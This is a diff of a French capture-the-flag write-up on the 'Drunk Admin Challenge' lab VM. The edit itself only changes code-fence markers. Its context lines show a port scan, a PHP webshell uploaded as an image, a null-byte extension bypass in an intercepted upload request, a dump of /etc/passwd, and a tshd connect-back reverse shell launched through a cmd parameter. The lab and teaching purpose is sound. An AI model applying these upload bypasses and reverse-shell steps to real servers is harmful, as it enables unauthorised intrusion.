@@ -21,7 +21,7 @@ Apéro
 
 Le scan des ports indique qu'un serveur web écoute sur le port 8880 en plus du serveur SSH. Les autres ports sont filtrés donc on aura peut-être à utiliser un reverse shell.  
 
-```plain
+```
 Nmap scan report for 192.168.1.30
 Host is up (0.00019s latency).
 Not shown: 65533 filtered ports
@@ -79,7 +79,7 @@ Je modifie la backdoor pour mettre *<?php readile("/etc/passwd"); ?>* et cette f
 
 En revanche quand j'appelle l'image via *curl* on voit clairement que le serveur n’interprète pas le PHP car il considère le fichier comme une image :  
 
-```plain
+```
 HTTP/1.1 200 OK
 Server: Apache/2.2.16 (Debian)
 Content-Length: 33
@@ -129,7 +129,7 @@ Il doit être possible d'utiliser des outils similaires comme *Zed Attack Proxy*
 
 Après voir configuré *Charles* comme proxy HTTP intercepteur et fait un upload de la backdoor en *.png.html*, on édite la requête HTTP pour modifier l'extension en *.png%00.phtml* (on injecte un octet nul) :  
 
-```plain
+```
 POST /upload.php HTTP/1.1
 Host: 192.168.1.30:8880
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:30.0) Gecko/20100101 Firefox/30.0
@@ -159,7 +159,7 @@ Quand on demande l'image uploadée avec l'extension *.phtml* le PHP est bien ex�
 
 Avec curl on obtient plus facilement l'output :  
 
-```plain
+```
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/bin/sh
 bin:x:2:2:bin:/bin:/bin/sh
@@ -190,7 +190,7 @@ On réitère l'opération d'upload mais cette fois notre script accepte comme ar
 
 Ainsi on retrouve dans *index.php* :  
 
-```plain
+```
           <p>Uploaded Images: <?php echo exec("find /var/www/images/ -type f | wc -l"); ?><br />
              Total Used Space: <?php echo exec("du -hs /var/www/images/ | cut -f1"); ?></p>
 ```
@@ -258,7 +258,7 @@ if( strpos($file,"perl") ||
 
 Quand au *.htaccess* dans */images* :  
 
-```plain
+```
 <Files *.php>
   RewriteEngine On
   RewriteBase /images/
@@ -284,7 +284,7 @@ Du coup j'ai écrit la backdoor suivante :
 
 Un upload et une exécution de *tshd* en mode connect-back plus tard (*/images/\_hash\_.phtml?cmd=setsid%20./tshcbd*) :  
 
-```plain
+```
 $ ./tsh cb
 Waiting for the server to connect...connected.
 $ id
@@ -295,7 +295,7 @@ $ pwd
 
 Dans */var/www*, on découvre un fichier *.proof* avec le contenu suivant :  
 
-```plain
+```
 #########################
 # Drunk Admin Challenge #
 #     by @anestisb      #
@@ -322,7 +322,7 @@ Malheureusement cette information ne nous permet pas de terminer la mission.
 
 On fouille plus on finit par trouver des fichiers dans le dossier web de l'utilisateur *bob* :  
 
-```plain
+```
 ./bob/public_html:
 total 20
 drwxr-xr-x 3 bob bob 4096 Mar  6  2012 .
